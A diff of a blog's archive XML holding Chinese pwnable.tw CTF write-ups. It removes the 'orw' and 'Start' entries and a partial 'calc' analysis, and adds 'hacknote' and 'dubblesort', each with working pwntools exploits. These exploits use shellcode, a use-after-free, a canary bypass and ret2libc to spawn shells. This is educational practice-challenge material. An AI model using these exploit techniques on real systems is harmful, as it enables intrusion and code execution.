@@ -15,121 +15,148 @@
       </categories>
   </entry>
   <entry>
-    <title>orw</title>
-    <url>/archives/6fa2aae4.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw - orw"></a>pwnable.tw - orw</h2><span id="more"></span>
+    <title>hacknote</title>
+    <url>/archives/c5963d96.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-hacknote"><a href="#pwnable-tw-hacknote" class="headerlink" title="pwnable.tw - hacknote"></a>pwnable.tw - hacknote</h2><span id="more"></span>
 
 <hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>丢进ida可以发现有个orw_seccomp函数，于是用<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看限制：</p>
-<p><img src="https://i.loli.net/2021/07/10/WnQ5zPIfiR8gujA.png"></p>
-<p>只能用open，read，write。</p>
-<p>已知flag在<code>/home/orw/flag</code>，那只需要open它，read它，再write到标准输出就行</p>
-<p>并且这个程序流程就是输入shellcode并运行，那直接构造shellcode就行</p>
-<p>值得注意的点： 函数的返回值在eax中，在read的时候先把eax给ebx，再改为read的系统调用号</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./orw&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call op</span></span><br><span class="line"><span class="string">    .ascii &quot;/home/orw/flag&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">op:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ecx,ebx</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov edx,0xff</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendafter(<span class="string">&quot;shellcode:&quot;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看保护：栈上不可执行，有canary，动态链接</p>
+<p><img src="https://i.loli.net/2021/07/21/AKgWeCxqcZfmDh5.png"></p>
+<p>下面看看程序流程，根据交互和main函数的逻辑可以初步判断各个函数的名字和作用</p>
+<p><img src="https://i.loli.net/2021/07/21/cY9ZpFk8CQemDNv.png"></p>
+<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h3><p><img src="https://i.loli.net/2021/07/21/XHlEADkxLdjiIWq.png"></p>
+<p>首先，很明显，申请的note不能超过5个</p>
+<p>然后，经过分析，可以看到，每次add_note会malloc两个堆块，一个8byte，我们叫做<code>head</code>；另一个大小是size（用户输入），叫做<code>data</code></p>
+<p>那么这个ptr就是一个结构体（note_struct）的指针，note_struct里面有两个指针，分别指向head堆块和data堆块，于是可以创建一个结构体，并把ptr和v0的类型改成<code>note_stuct *</code></p>
+<blockquote>
+<p>关于ida中创建结构体：可参考<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html">https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html</a></p>
+</blockquote>
+<p>head堆块中存了一个函数output的地址，这个后面再看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptr[i]  ---&gt; head: head_chunk_addr  ---&gt; output_addr  ---&gt; func_output</span><br><span class="line">        ---&gt; data: data_chunk_addr  ---&gt; data</span><br></pre></td></tr></table></figure>
 
+<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note()"></a>print_note()</h3><p><img src="https://i.loli.net/2021/07/21/egV4iAkqnfBWpK7.png"></p>
+<p>可以看到直接调用了head堆块中的那个函数，并且参数是<code>ptr[v1]</code>，那么来看一下output函数：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以把a1的类型改成<code>note_struct *</code>,</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">output</span><span class="params">(note_struct *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就很清晰了，打印data块的内容，也符合menu中的名字</p>
+<p>（所以我把这个函数名改成output，原来就是个地址</p>
+<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note()"></a>delete_note()</h3><p><img src="https://i.loli.net/2021/07/21/dxgjQNH9DUERflM.png"></p>
+<p>漏洞出现了！</p>
+<p>它在free之后没有把<code>ptr[v1]</code>清空，就会有<code>use after free (uaf)</code>漏洞</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们可以利用print_note()，它会执行head指向的那个函数，所以只要我们能把head改成system的地址，后面放上命令，就能getshell了</p>
+<p>我们先add两个note，大小随便，因为我们要打的是那个8字节的head，这里就用0x30</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#add_note(size, data)</span></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>于是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x10: 0x9c4d048(note1_head) —▸ 0x9c4d000(note0_head) ◂— 0x0</span><br><span class="line">0x18: 0x0</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x28: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x38: 0x9c4d058(note1_data) —▸ 0x9c4d010(note0_data) ◂— 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure>
+
+<p>如果这个时候我们add一个note2，size写0x8，</p>
+<p>note2_head就会写在note1_head，</p>
+<p>note2_data就会写在note0_head，</p>
+<blockquote>
+<p>先malloc head块，再malloc data块</p>
+</blockquote>
+<p>然后print一下note0，就能执行我们想要的东西了</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>note2_data里写：原本output函数的地址+puts的got表地址，就能泄露libc</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>note2_data里写：system函数的地址+命令</p>
+<p>这里命令的写法有些麻烦，因为print_note()调用head指向的函数时，传过去的参数是<code>ptr[v1]</code>，这个指针正好指向head，head里是我们覆盖的system_addr，system_addr显然不是个可以执行的命令，</p>
+<p>所以我们得在命令里写<code>;sh;</code>，</p>
+<ul>
+<li>前一个分号：如果每个命令被一个分号 (;) 所分隔，那么命令会连续的执行下去，无论命令是否正确，<a href="https://blog.csdn.net/freedom2028/article/details/7104131">关于linux中连续命令执行</a></li>
+<li>后一个分号是无所谓的，写个<code>\0</code>也行，只是填满8个字节</li>
+<li>也可以写成<code>||sh</code>，因为<code>||</code>是执行到正确的命令才终止</li>
+</ul>
+<div class="note danger"><p>在泄露libc之后，要把note2释放掉</p>
+<p>而因为delete_note()，是先free data块，再free head块，所以note2释放后正好和之前一样</p>
+</div>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"><span class="comment"># r = process(&quot;./hacknote&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">output_addr = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">payload = p32(output_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(r.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc.address)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;;sh;&#x27;</span></span><br><span class="line">add_note(<span class="number">0x8</span>,payload)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/">https://v1ckydxp.github.io/2019/05/02/pwnable.tw-hacknote-writeup/</a></p>
+<p><a href="http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/">http://0gur1.cc/2018/03/08/pwnable-tw-hacknote/</a></p>
+<p><a href="https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb">https://medium.com/yuru-sec/pwnable-tw-hacknote-writeup-83129787adbb</a></p>
 ]]></content>
-      <categories>
-        <category>pwnable.tw</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
-      </tags>
   </entry>
   <entry>
-    <title>Start</title>
-    <url>/archives/5eb87a8b.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-Start"><a href="#pwnable-tw-Start" class="headerlink" title="pwnable.tw - Start"></a>pwnable.tw - Start</h2><span id="more"></span>
+    <title>dubblesort</title>
+    <url>/archives/51d1aace.html</url>
+    <content><![CDATA[<h2 id="pwnable-tw-dubblesort"><a href="#pwnable-tw-dubblesort" class="headerlink" title="pwnable.tw - dubblesort"></a>pwnable.tw - dubblesort</h2><span id="more"></span>
 
 <hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先checksec，得到32位程序且保护全关</p>
-<p><img src="https://i.loli.net/2021/07/10/qIBS1ro3nxzEvZY.png"></p>
-<p>扔进ida看看，程序流程很简单，输出一段话，然后请求一次输入，最多输入3c个字符</p>
-<p><img src="https://i.loli.net/2021/07/10/7tmIOrjiMQv9e5o.png"></p>
-<p>很明显的栈溢出</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以发现read的时候ecx没有变过，也就是读到<code>“Let&#39;s start the CTF:”</code>的位置，也即esp的位置，</p>
-<p>而在程序末尾看到 <code> add esp, 14h</code> ，可知padding是0x14</p>
-<p>那么思路就是在栈上布置shellcode，然后返回地址覆盖shellcode的地址</p>
-<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>我们还有<code>write</code>函数，可以先栈溢出，再调用一次<code>write</code>，就能泄露栈地址</p>
-<p>（在<code>retaddr</code>后面正好是程序开头<code>push</code>进去的栈上的地址，再调用write就会把这个地址打印出来）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看保护，好家伙，保护全开</p>
+<p><img src="https://i.loli.net/2021/07/13/v7OlDzmIHKnYR23.png"></p>
+<p>看看程序流程，大概就是输入个名字，然后输入一堆数，冒泡排序后输出</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p><img src="https://i.loli.net/2021/07/13/OgABFh6tqYMckDK.png"></p>
+<p>输了几次名字，发现会有段乱码，丢进ida看看，果然输出名字的地方有问题</p>
+<p>他是read输入的，不会在末尾加上<code>\x00</code>截断，又用printf输出，还用了<code>%s</code>，那栈上东西就好泄露了；加上题目给了libc文件，大概就是个ret2libc吧</p>
+<p>用gdb调一下，看看栈上有什么东西可以泄露</p>
+<blockquote>
+<p>对于开了pie保护的程序，可以用<code>b *$rebase(your_addr)</code>来下断点</p>
+</blockquote>
+<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
+<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
+<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
+<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
+</div>
 
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有了栈地址之后，直接ret2shellcode就行了</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./start&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    call here</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    mov al, 0xb</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">write = <span class="number">0x08048087</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(write)</span><br><span class="line">r.send(payload)</span><br><span class="line">stack = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(stack+<span class="number">0x14</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
+<p>下面算一下got表的在libc中的偏移：</p>
+<ul>
+<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
+</li>
+<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
+<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />
 
+<blockquote>
+<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
+<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
+</blockquote>
+</li>
+</ul>
+<p>至此，libc地址就被泄露了</p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
+<p>现在有两个问题：</p>
+<ul>
+<li>开了canary</li>
+<li>它会从小到大排序后再写在栈上原来位置</li>
+</ul>
+<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
+<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
+</blockquote>
+<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
+<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
+<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
+<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
+<p>再看canary到retaddr的距离</p>
+<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
+<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
+<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
+<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
+<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
+<p>所以如图：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>
 
+<p>总共输入<code>24+1+7+3=35</code>个数字</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
+<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
+<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
+<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
+<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
 ]]></content>
       <categories>
         <category>pwnable.tw</category>
       </categories>
       <tags>
-        <tag>shellcode</tag>
         <tag>stackoverflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>calc</title>
-    <url>/archives/5c3132af.html</url>
-    <content><![CDATA[<h2 id="pwnable-tw-calc"><a href="#pwnable-tw-calc" class="headerlink" title="pwnable.tw - calc"></a>pwnable.tw - calc</h2><span id="more"></span>
-
-<hr>
-<h2 id="找洞"><a href="#找洞" class="headerlink" title="找洞"></a>找洞</h2><p>先看下保护，</p>
-<p><img src="https://i.loli.net/2021/07/12/oZBfPkaNpDIg92F.png"></p>
-<p>丢进ida分析程序，粗略看就是实现了一个简单计算器的功能，不支持括号</p>
-<h3 id="看一下calc-函数"><a href="#看一下calc-函数" class="headerlink" title="看一下calc()函数"></a>看一下calc()函数</h3><p><img src="https://i.loli.net/2021/07/12/4lJ17y5uWGme9cK.png"></p>
-<p>先是把expr置零，并用<code>get_expr()</code>输入进来，看代码可知这个函数过滤了除数字以及+-*/%之外的字符，到<code>0x0a</code>即<code>&#39;\n&#39;</code>结束</p>
-<p><img src="https://i.loli.net/2021/07/12/LiVcjf51ykS2Nxu.png"></p>
-<p>然后将一个ans数组置零，parse_expr()显然就是实现计算器功能的函数，顺便看到他输出的结果是<code>ans[ans[0]]</code>，这里提醒我们要注意<code>ans[0]</code>的内容</p>
-<h3 id="分析parse-expr"><a href="#分析parse-expr" class="headerlink" title="分析parse_expr()"></a>分析<code>parse_expr()</code></h3><p>实现方法很常规，就是把运算符和操作数分离，然后再运算</p>
-<h4 id="先看分离的过程"><a href="#先看分离的过程" class="headerlink" title="先看分离的过程"></a>先看分离的过程</h4><p>它维护了两个数组，一个op_buf[100]存了运算符，另一个是calc()调用的时候传进来的ans</p>
-<p><img src="https://i.loli.net/2021/07/12/UgxBH9nfeuRl2LW.png"></p>
-<p>首先，函数进一个大循环，</p>
-<p><strong>如果当前位置是数字</strong>，就什么都不做，进入下一轮循环</p>
-<p><strong>如果是运算符</strong>，（注意到有一个<code>unsigned int</code>，保证了<code>运算符-&#39;0&#39;</code>无论如何都大于9）</p>
-<p>程序先把左操作数取到s1中，然后做一个判断：左操作数是否为0，若是，就报错退出（这在数学上不太合理，anyway，这是个pwn题</p>
-<p>然后把左操作数转成数字，放进ans，先<code>ans[0]++</code>，然后把操作数放在<code>ans[ans[0]+1]</code>，可以猜测<code>ans[0]</code>是一个标志或者计数器</p>
-<p>后面又是一个判断：后一个字符是否是运算符，若是，报错退出（就是防止类似<code>1++1</code>这种东西</p>
-<h4 id="下面分析运算的部分"><a href="#下面分析运算的部分" class="headerlink" title="下面分析运算的部分"></a>下面分析运算的部分</h4><p><img src="https://i.loli.net/2021/07/12/hgqn9bZSis6xY7t.png"></p>
-<p>它不会在读到第一个运算符马上运算<del>废话</del>，一是没有右操作符，二是类似<code>1+5*2</code>这种有运算优先级的问题需要处理</p>
-<p>所以它是读到第二个运算符再来处理，用op_num来维护当前运算到哪个运算符，</p>
-<p>至于运算的流程很简单，如果是*/%，看前面是不是+-，若是，等待下一个运算符，若不是就运算</p>
-<p>运算这里有一个<code>eval()</code>函数很重要，我们来看一下：</p>
-<p><img src="https://i.loli.net/2021/07/12/ciZtWpon31uMSyG.png"></p>
-<p>可以看到<code>ans[ans[0]-1]</code>和<code>ans[ans[0]]</code>分别为当前运算符的左右操作数，于是<code>ans[0]</code>记录的就是最新的运算符的左操作数，也就是上一个运算符的右操作数</p>
